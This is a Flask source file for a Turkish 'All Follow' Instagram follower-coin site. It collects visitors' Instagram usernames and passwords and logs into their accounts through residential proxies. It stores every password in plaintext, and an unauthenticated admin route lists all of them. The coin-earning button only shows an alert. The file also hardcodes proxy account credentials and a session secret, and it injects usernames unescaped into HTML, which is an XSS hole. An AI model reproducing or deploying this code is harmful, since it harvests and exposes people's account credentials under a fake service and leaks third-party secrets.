import os, random, time
from flask import Flask, request, jsonify, render_template_string, session, redirect
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client

app = Flask(__name__)
app.secret_key = "all_follow_v14_final"
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v14.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- MODELLER ---
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    coins = db.Column(db.Integer, default=10)

class Ticket(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user = db.Column(db.String(100))
    msg = db.Column(db.Text)

# --- PROXY LIST (Burayı Proxy-Cheap'ten aldığın en yeni IP'lerle güncelle kanka) ---
PROXY_LIST = [
    "http://pcUjiruWbB-res-tr-sid-92358982:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-37932429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
]

HTML_UI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>All Follow | {{ title }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style> body { background: #050505; color: white; font-family: sans-serif; } </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
    <div class="w-full max-w-md bg-[#111] p-8 rounded-3xl border border-white/5 shadow-2xl">
        <h1 class="text-3xl font-black text-center text-blue-500 mb-8 italic tracking-tighter">ALL FOLLOW</h1>
        {{ body | safe }}
        <div class="mt-10 flex justify-center space-x-6 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
            <a href="/">Giriş</a><a href="/panel">Panel</a><a href="/destek">Destek</a><a href="/admin_ozel">Admin</a>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    body = """
    <div class="space-y-4">
        <input id="u" placeholder="Instagram Kullanıcı Adı" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none">
        <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none">
        <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-black uppercase text-sm">Giriş Yap</button>
        <p id="msg" class="text-xs text-center text-yellow-500 font-bold"></p>
    </div>
    <script>
        async function login(){
            const u=document.getElementById('u').value, p=document.getElementById('p').value;
            const btn=document.getElementById('btn'), msg=document.getElementById('msg');
            if(!u || !p) return;
            btn.innerText="GİRİŞ DENENİYOR...";
            try {
                const r = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u, p})
                });
                const d = await r.json();
                msg.innerText = d.msg;
                if(d.status === "success") window.location.href = "/panel";
            } catch(e) { msg.innerText = "Bağlantı koptu!"; }
            btn.innerText = "Giriş Yap";
        }
    </script>
    """
    return render_template_string(HTML_UI, title="Giriş", body=body)

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    cl = Client()
    cl.request_timeout = 20 # Süreyi biraz uzattık
    
    # --- 1. DENEME: PROXY İLE ---
    px = random.choice(PROXY_LIST)
    cl.proxies = {"http": px, "https": px}
    
    try:
        print(f"DEBUG: {px} ile deneniyor...")
        if cl.login(u, p):
            return finalize_login(u, p)
    except Exception as e:
        print(f"DEBUG: Proxy patladı: {e}")
        # --- 2. DENEME: DOĞRUDAN (PROXY'SİZ) ---
        try:
            print("DEBUG: Proxy'siz deneniyor...")
            cl.proxies = {} 
            if cl.login(u, p):
                return finalize_login(u, p)
        except Exception as e2:
            err_msg = str(e2).lower()
            if "checkpoint" in err_msg: return jsonify(status="error", msg="Instagram'a girip 'Bendim' demen lazım!")
            if "bad_password" in err_msg: return jsonify(status="error", msg="Şifre Yanlış!")
            return jsonify(status="error", msg="Instagram bağlantıyı reddetti.")

def finalize_login(u, p):
    user = User.query.filter_by(username=u).first()
    if not user:
        user = User(username=u, password=p)
        db.session.add(user)
    db.session.commit()
    session['user'] = u
    return jsonify(status="success", msg="Başarılı!")

@app.route('/panel')
def panel():
    if 'user' not in session: return redirect('/')
    u = User.query.filter_by(username=session['user']).first()
    body = """
    <div class="text-center">
        <p class="text-xs text-gray-400 mb-2">@{}</p>
        <div class="bg-blue-600/10 border border-blue-500/20 py-10 rounded-3xl mb-6 text-5xl font-black text-blue-500">
            {}
        </div>
        <button onclick="alert('Coin Kasma Aktif!')" class="w-full bg-emerald-600 py-4 rounded-xl font-black uppercase text-sm text-white">Coin Kazan</button>
    </div>
    """.format(u.username, u.coins)
    return render_template_string(HTML_UI, title="Panel", body=body)

@app.route('/admin_ozel')
def admin_ozel():
    users = User.query.all()
    res = "<div class='text-[10px] uppercase font-bold text-blue-400 mb-4'>Kullanıcı Listesi</div>"
    for u in users:
        res += "<div class='text-[10px] mb-2 p-2 bg-black border border-white/5'>{} | {} | {}C</div>".format(u.username, u.password, u.coins)
    return render_template_string(HTML_UI, title="Admin", body=res)

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=10000)
